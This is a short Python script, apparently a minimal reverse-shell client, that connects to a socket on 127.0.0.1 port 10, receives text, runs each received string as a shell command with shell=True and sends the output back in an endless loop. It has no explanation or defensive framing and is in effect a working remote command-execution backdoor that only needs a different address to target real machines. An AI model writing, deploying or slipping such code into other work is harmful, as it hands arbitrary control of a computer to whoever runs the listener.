import socket, subprocess

 
s = socket.socket()         
 
port = 10               

s.connect(('127.0.0.1', port)) 

while True:
    instruction = s.recv(1024).decode()
    result = subprocess.run(instruction, capture_output=True, text=True, shell=True)
    s.send(result.stdout.encode()) 
s.close()     
     